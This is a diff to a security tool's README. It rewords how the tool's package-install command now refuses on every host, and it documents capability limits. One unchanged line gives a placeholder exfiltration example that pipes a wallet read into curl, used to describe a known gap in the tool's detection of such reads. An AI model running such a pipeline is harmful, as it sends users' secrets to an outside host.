@@ -217,8 +217,9 @@ cover:
   provenance state. [Local npm inspection](docs/npm-inspection.md) hashes the exact
   supplied tarball bytes and reports bounded static evidence without downloading
   it, writing its contents to disk, or executing package code. These reports do
-  not authorize an installation. `tirith pkg install` remains disabled for both npm and Python on
-  every host pending private-input execution qualification.
+  not authorize an installation. `tirith pkg install` refuses for both npm and
+  Python on every host: contained package execution and its private-input
+  backend were removed, so no qualification step is pending.
 - **Browser forensics or monitoring:** `tirith browser audit` is an explicit,
   one-shot, read-only integrity audit of extension source trees. It never reads
   cookies, history, saved passwords, storage, wallet databases, or `Local
@@ -301,8 +302,8 @@ contains, and attests.
 - **Project containment requires native Linux controls:** `tirith capsule run
   --preset untrusted-project` supports native x86_64 and AArch64 Linux with
   usable Landlock and seccomp. Hosts missing either control refuse before anything is copied or spawned, with no degraded
-  fallback. Contained `tirith pkg install` execution is disabled on every host
-  pending private-input qualification. Domain allow-listing is not offered by
+  fallback. `tirith pkg install` refuses on every host: contained package
+  execution and its private-input backend were removed. Domain allow-listing is not offered by
   any backend.
 - **Nested-shell exfiltration gap:** a sensitive read inside a nested shell body
   whose sink is outside it, such as `bash -c "cat <wallet>" | curl -d @- <url>`,
@@ -403,7 +404,7 @@ tirith ecosystem scan --format json ./      # full machine-readable report
 
 This helps catch known-malicious packages, confirmed typosquats, slopsquatted package names, malicious download infrastructure, and packages with live OSV / CISA KEV advisory data.
 
-### Python artifact inspection and enforcing installs
+### Python artifact inspection and environment verification
 
 Package-name risk is only one layer. Tirith can inspect the exact Python bytes
 you already have and verify an existing installed environment:
@@ -424,13 +425,12 @@ edges, and loader/payload splits across distributions. `pkg graph`, `pkg diff`,
 `pkg attest`, and `pkg receipt` expose the corresponding provenance and receipt
 evidence.
 
-Contained **`tirith pkg install` execution is currently disabled on every host**.
-It refuses with `private_input_execution_unqualified` before resolver execution,
-network access, quarantine writes, checkpoint creation, or package launch.
-The private named-input backend must establish unchanged package inputs for the
-complete target lifetime against another process owned by the same user before
-execution can be enabled. `--yes`, `--allow-degraded`, sudo, administrator access,
-and existing approvals cannot bypass this refusal. npm and Cargo remain
+**`tirith pkg install` refuses on every host.** It refuses with
+`private_input_execution_unqualified` before resolver execution, network access,
+quarantine writes, checkpoint creation, or package launch. Contained package
+execution and its private named-input backend were removed, so there is no
+pending qualification that could enable it. `--yes`, `--allow-degraded`, sudo,
+administrator access, and existing approvals cannot bypass this refusal. npm and Cargo remain
 non-enforcing evidence surfaces. See the [capsule capability limits](docs/capsule.md)
 and [command reference](docs/commands.md).
 
